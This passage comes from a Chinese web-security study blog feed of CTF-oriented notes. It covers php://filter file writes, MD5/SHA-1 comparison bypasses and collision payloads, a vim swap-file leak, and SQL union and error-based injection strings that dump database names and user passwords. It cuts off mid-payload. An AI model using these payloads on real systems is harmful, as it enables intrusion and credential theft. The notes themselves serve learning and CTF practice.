绕过不能重复包含文件的限制</a>。</p><h2 id="php-filter进阶用法"><a href="#php-filter进阶用法" class="headerlink" title="php:&#x2F;&#x2F;filter进阶用法"></a>php:&#x2F;&#x2F;filter进阶用法</h2><p>参数说明：</p><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>&lt;;两个链的筛选列表&gt;</code></td><td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>过滤器：</p><ul><li><p>字符串过滤器</p><ul><li><p><strong>string.rot13</strong>：使用该过滤器也就是用 str_rot13() 函数处理所有的流数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is a test</span><br><span class="line">==&gt;</span><br><span class="line">Guvf vf n grfg</span><br></pre></td></tr></table></figure></li><li><p><strong>string.toupper</strong>：使用此过滤器等同于用 strtoupper() 函数处理所有的流数据。</p></li><li><p><strong>string.tolower</strong>：使用此过滤器等同于用 strtolower() 函数处理所有的流数据。</p></li><li><p><strong>string.strip_tags</strong>：使用此过滤器等同于用 strip_tags() 函数处理所有的流数据。</p></li></ul></li><li><p>转换过滤器</p><ul><li><p><strong>convert.base64-encode、convert.base64-decode</strong>：使用这两个过滤器等同于分别用 base64_encode() 和 base64_decode() 函数处理所有的流数据。</p></li><li><p><strong>convert.quoted-printable-encode、convert.quoted-printable-decode</strong>：使用此过滤器的 decode 版本等同于用 quoted_printable_decode() 函数处理所有的流数据。没有和 convert.quoted-printable-encode 相对应的函数。</p></li><li><p>**convert.iconv.**<em>：在激活 iconv 的前提下可以使用 convert.iconv.</em> 压缩过滤器， 等同于用 iconv() 处理所有的流数据。 </p><blockquote><p><strong>iconv()</strong></p><p>(PHP 4 &gt;&#x3D; 4.0.5, PHP 5, PHP 7)</p><p>iconv ( <strong>string</strong> $in_charset , <strong>string</strong> $out_charset , <strong>string</strong> $str ) : <strong>string</strong></p><p>将字符串 <code>str</code> 从 <code>in_charset</code> 编码转换到 <code>out_charset</code> 编码。</p><p>参数：</p><ul><li>in_charset：输入的字符集。 </li><li>out_charset：输出的字符集。如果你在 out_charset 后添加了字符串 <code>//TRANSLIT</code>，将启用转写功能。这个意思是，当一个字符不能被目标字符集所表示时，它可以通过一个或多个形似的字符来近似表达。 如果你添加了字符串 <code>//IGNORE</code>，不能以目标字符集表达的字符将被默默丢弃。 否则，会导致一个 E_NOTICE 并返回 FALSE。 </li><li>str：要转换的字符串。</li></ul><p>返回值：返回转换后的字符串， 或者在失败时返回 <strong><code>FALSE</code></strong> 。</p><p>支持的字符集：UCS-4*、UTF-8*、ASCII* 等，参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>。</p></blockquote><p>该过滤器不支持参数，但可使用输入&#x2F;输出的编码名称，组成过滤器名称，比如 convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 或 convert.iconv.&lt;input-encoding&gt;&#x2F;&lt;output-encoding&gt; （两种写法的语义都相同）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">/* 输出：This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>压缩过滤器</p><ul><li><p><strong>zlib.deflate、zlib.inflate</strong>：分别为压缩、解压。 </p></li><li><p><strong>bzip2.compress、bzip2.decompress</strong>：<code>bzip2.compress</code> 和 <code>bzip2.decompress</code> 工作的方式与上面讲的 zlib 过滤器相同。</p></li></ul></li><li><p>加密过滤器</p><ul><li>**mcrypt.*、mdecrypt.***：过于抽象，略。</li></ul></li></ul><p>写入文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>无编码：<code>?file=php://filter/resource=test.txt&amp;content=flag</code></p></li><li><p>base64编码：<code>?file=php://filter/write=convert.base64-encode/resource=test.txt&amp;content=flag</code></p></li></ul><p>实战应用：主要是<a href="https://www.anquanke.com/post/id/202510#h2-11">绕过“死亡exit”</a>，很好的文章，常看常新。</p><h2 id="pearcmd-php利用"><a href="#pearcmd-php利用" class="headerlink" title="pearcmd.php利用"></a>pearcmd.php利用</h2><p>过于抽象，日后研究：</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">pearcmd.php的妙用</a></p><p><a href="https://blog.csdn.net/qq_62078839/article/details/124208151">例题</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MD5绕过与SHA-1绕过</title>
    <link href="http://example.com/2024/02/25/MD5%E7%BB%95%E8%BF%87%E4%B8%8ESHA-1%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/02/25/MD5%E7%BB%95%E8%BF%87%E4%B8%8ESHA-1%E7%BB%95%E8%BF%87/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T07:54:15.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h1><p>​SHA-1 也适用。</p><p>​当字符串为 <code>^[0-9]+e[0-9]+</code> 模式时，PHP 将试图把字符串转换为用科学计数法表示的数。如果不是真正的科学计数法表示的数，即 e 后面不全是数字，转换将出错，此时 PHP 将把它视为一个字符串。</p><p>​所以，如果两字符串的 MD5 值都是 <code>^0e[0-9]+</code> 模式，即 e 后全部是数字，则可绕过 MD5 弱相等。</p><p>​以下字符串的 MD5 值均为 <code>^0e[0-9]+</code> 的模式，即可转为数字 0 ：</p><ul><li>QNKCDZO</li><li>QLTHNDT</li><li>PJNPDWY</li><li>NWWKITQ</li><li>NOOPCJF</li><li>MMHUWUV</li><li>MAUXXQC</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li></ul><p>​以下字符串的 SHA-1 值均为 <code>^0e[0-9]+</code> 的模式，即可转为数字 0 ：</p><ul><li>10932435112</li><li>aaroZmOk</li><li>aaK1STfY</li><li>aaO8zKZF</li><li>aa3OFF9m</li><li>0e1290633704</li></ul><p>​对于双重 md5() ，以下字符串进行两次 md5() 后以 0e 开头：</p><ul><li>7r4lGXCH2Ksu2JNT3BYM</li><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li></ul><p>​对于 <code>$a==md5($a)</code> ：</p><ul><li>0e215962017</li></ul><p>​绕过 SQL 中的 md5() ，参考<a href="https://www.ctfer.vip/problem/713">[BJDCTF 2020]easy_md5</a> ：</p><ul><li><code>ffifdyop</code> ，经过 md5() 函数后结果为 <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code></li><li><code>129581926211651571912466741651878684928</code> ，经过 md5() 函数后结果为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code></li></ul><h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>​PHP md5() 函数不能处理数组类型的量，将返回 NULL 。使用数组可以绕过 MD5 弱相等和强相等。</p><p>​sha1() 也不能处理数组类型的量，所以使用数组也可以绕过 SHA-1 弱相等和强相等。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>[]=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>[]=<span class="number">2</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>); <span class="comment">//NULL==NULL</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>); <span class="comment">//NULL===NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  int(1)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="NaN和INF绕过"><a href="#NaN和INF绕过" class="headerlink" title="NaN和INF绕过"></a>NaN和INF绕过</h1><p>​NAN 和 INF ，分别为非数字和无穷大，但 var_dump() 显示的数据类型都是 double 。</p><p>​NAN 和 INF 拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为 false ，甚至  <code>NAN===NAN</code> 也是false 。但 md5() 函数处理它们的时候，是将其直接转换为<strong>字符串</strong> <code>NAN</code> 和<code> INF</code> 使用的，故 <code>md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)</code> 为 true 。</p><h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><p>​几组 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   </span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   </span><br><span class="line">#2</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   </span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</span><br><span class="line">#3</span><br><span class="line">$a=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$b=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br></pre></td></tr></table></figure><p>​Windows 下可用 fastcoll.exe 生成。</p><h1 id="SHA-1碰撞"><a href="#SHA-1碰撞" class="headerlink" title="SHA-1碰撞"></a>SHA-1碰撞</h1><p>​payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0e绕过&quot;&gt;&lt;a href=&quot;#0e绕过&quot; class=&quot;headerlink&quot; title=&quot;0e绕过&quot;&gt;&lt;/a&gt;0e绕过&lt;/h1&gt;&lt;p&gt;​		SHA-1 也适用。&lt;/p&gt;
&lt;p&gt;​		当字符串为 &lt;code&gt;^[0-9]+e[0-9]+&lt;/code&gt; 模式时，</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息泄露</title>
    <link href="http://example.com/2024/02/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://example.com/2024/02/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T08:09:17.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vim泄露"><a href="#vim泄露" class="headerlink" title="vim泄露"></a>vim泄露</h1><p>​<code>vim &lt;filename&gt;</code> 命令，用 vim 打开文件。</p><p>​用 vim 编辑文件时，如果正在编辑中的文件意外退出了，将会自动创建一个备份文件。如果文件名是 test.txt ，那么备份文件就是 .test.txt.swp ，并且备份文件不会展示出来。如果管理员没有删除这个备份文件，那么这个备份文件可能会被下载下来利用。</p><p>​使用 <code>vim -r .test.txt.swf</code> 命令打开备份文件。</p><p>​例题，<a href="https://www.nssctf.cn/problem/3866">[LitCTF 2023]Vim yyds</a> 。</p><p>​不开工具进行信息搜集，啥也没有。</p><p>​下载页面 HTML 文档和图片文件，均用 vim 打开也没有什么。</p><p>​开启目录扫描，发现主页面文件为 <code>index.php</code> ，尝试访问 <code>/.index.php.swf</code> ，浏览器自动下载了该文件，说明存在 vim 泄露。</p><p>​vim 打开 .index.php.swf ，审计代码。</p><p>​payload：<code>password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</code> 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vim泄露&quot;&gt;&lt;a href=&quot;#vim泄露&quot; class=&quot;headerlink&quot; title=&quot;vim泄露&quot;&gt;&lt;/a&gt;vim泄露&lt;/h1&gt;&lt;p&gt;​		&lt;code&gt;vim &amp;lt;filename&amp;gt;&lt;/code&gt; 命令，用 vim 打开文件。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>散列碰撞</title>
    <link href="http://example.com/2024/02/25/%E6%95%A3%E5%88%97%E7%A2%B0%E6%92%9E/"/>
    <id>http://example.com/2024/02/25/%E6%95%A3%E5%88%97%E7%A2%B0%E6%92%9E/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T08:14:09.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MD5和SHA-1"><a href="#MD5和SHA-1" class="headerlink" title="MD5和SHA-1"></a>MD5和SHA-1</h1><p>​MD5（Message Digest Algorithm 5）是一种散列函数，用于计算消息的128位（16字节）散列值。</p><p>​SHA-1（Secure Hash Algorithm 1）也是一种散列函数，用于计算消息的160位（20字节）散列值。</p><p>​SHA-1 相对于 MD5 来说更安全。虽然 MD5 和 SHA-1 都容易受到碰撞攻击，但 SHA-1 比 MD5 更安全，因为它具有更大的散列值（160位比128位），提供了更高的抗碰撞能力。</p><p>​由于安全性的问题，MD5 和 SHA-1 已经不推荐用于与安全性相关的应用，如密码存储和数字签名。对于需要更高安全性的应用，如密码哈希、数字证书、数据完整性验证等，应该使用更安全的散列算法，如 SHA-256、SHA-384 或 SHA-512。</p><p>​尽管 MD5 和 SHA-1 在安全性方面存在问题，但它们仍然在某些非安全性相关的应用中有用。例如，用于简单的数据完整性检验或生成简短的哈希值，而不涉及密码或敏感数据的安全性。</p><h1 id="散列碰撞"><a href="#散列碰撞" class="headerlink" title="散列碰撞"></a>散列碰撞</h1><p>​散列碰撞是指找到两个不同的输入消息，但它们具有相同的散列值。</p><p>​MD5 在理论上可以通过穷举法找到碰撞，但需要极大的计算能力和时间。然而，随着计算技术的发展，攻击者已经能够通过使用分布式计算和专用硬件等方法，实现更快速地生成 MD5 碰撞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MD5和SHA-1&quot;&gt;&lt;a href=&quot;#MD5和SHA-1&quot; class=&quot;headerlink&quot; title=&quot;MD5和SHA-1&quot;&gt;&lt;/a&gt;MD5和SHA-1&lt;/h1&gt;&lt;p&gt;​		MD5（Message Digest Algorithm 5）是一种散列函数，</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习</title>
    <link href="http://example.com/2024/02/25/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/02/25/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T10:57:57.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="–"><a href="#–" class="headerlink" title="–+"></a>–+</h3><p>​MySQL 中有三种注释符：<code>#</code> 、<code>--空格</code> 、<code>/**/</code> 。 </p><p>​url 中 # 会被浏览器解释为指导其动作的那个 # 号，所以如果需要使用 # ，需先将其 url 编码为 %23 。</p><p>​对于 <code>--空格</code> ，在 url 传入 <code>--+</code> 时，+ 号到后端后会变为空格。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​传入 <code>?cmd=--+123</code> ：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/14.png"></p><h3 id="select-1-database"><a href="#select-1-database" class="headerlink" title="select 1, database()"></a>select 1, database()</h3><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/1.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/2.png"></p><h3 id="引号、括号问题"><a href="#引号、括号问题" class="headerlink" title="引号、括号问题"></a>引号、括号问题</h3><p>​它可能查不到结果，但它不会报错：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/3.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/4.png"></p><p>​无论加几个半括号都可以：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/5.png"></p><h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul><li>system_user()：MySQL 用户名</li><li>user()：用户名</li><li>current_user：当前用户名</li><li>session_user()：连接数据库的用户名</li><li>database()：数据库名</li><li>version()、@@version：MySQL 版本</li><li>@@datadir：数据库路径</li><li>@@basedir：MySQL安装路径</li><li>@@version_compile_os：操作系统</li></ul><h3 id="一些语句"><a href="#一些语句" class="headerlink" title="一些语句"></a>一些语句</h3><ul><li>show databases：查看所有库名</li><li>show tables：查看当前库下所有表名</li><li>show columns from xxx：查看 xxx 表的所有字段名，如果表名是数字，需要用反引号包围</li></ul><h3 id="information-schema库三表"><a href="#information-schema库三表" class="headerlink" title="information_schema库三表"></a>information_schema库三表</h3><ul><li>information_schema.schemata：存储 MySQL 中的所有数据库的库名</li><li>information_schema.tables：存储 MySQL 中的所有数据表的表名</li><li>information_schema.columns：存储 MySQL 中的所有列的列名</li></ul><blockquote><p>MySQL5.0 以下，没有 information_schema 数据库。</p><p>MySQL5.0 以上，默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p></blockquote><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>​<code>id=1&#39;</code> 、<code>id=1&quot;</code> 、<code>id=1&#39;)</code> 、 <code>id=1&#39;))</code>  、<code>id=1&quot;)</code>  、<code>id=1&quot;))</code> 等。</p><h3 id="闭合推理"><a href="#闭合推理" class="headerlink" title="闭合推理"></a>闭合推理</h3><p>​示例，sqli-labs Less-7 ：</p><ul><li>1’：错</li><li>1” ：成</li><li>推出 ‘$id’</li><li>1’–+ ：错</li><li>推翻 ‘$id’</li><li>1’)–+：错</li><li>1’)) –+：成</li><li>推出 ((‘$id’))</li></ul><h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="爆语句"><a href="#爆语句" class="headerlink" title="爆语句"></a>爆语句</h3><p>​注入点检测。</p><h3 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h3><p>​<code>?id=1&#39; order by N--+</code></p><h3 id="爆回显位置"><a href="#爆回显位置" class="headerlink" title="爆回显位置"></a>爆回显位置</h3><p>​<code>?id=-1&#39; union select 1,2,3--+</code></p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>​<code>?id=-1&#39; union select 1,2,database()--+</code></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>​<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;xxx&#39;--+</code></p><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ul><li>精确到表：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39;--+</code></li><li>精确到库：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39;--+</code></li></ul><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><p>​<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+</code></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(xml_document, xpath_string)</span><br><span class="line">- xml_document：XML 文档名</span><br><span class="line">- xpath_string：目标 XML 标签在标签树的路径，如 `/book/author` 。</span><br></pre></td></tr></table></figure><p>​从目标 XML 文档中根据 xpath 匹配标签，匹配成功则返回其所包含的内容，未匹配到则返回 NULL 。</p><p>​extractvalue 使用时，当 xpath 格式出现错误，MySQL 会爆出 xpath 语法错误。</p><p>​注意不能用 group_concat() ，因为返回值太多了不能正常回显，只能 <code>limit N, 1</code> 来慢慢爆。 </p><ul><li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+</code>：爆数据库版本</li><li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select database()),0x7e))--+</code> ：爆库名</li><li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit N,1),0x7e))--+</code> ：爆表名</li><li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39; limit N,1),0x7e))--+</code>：爆列名</li><li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select 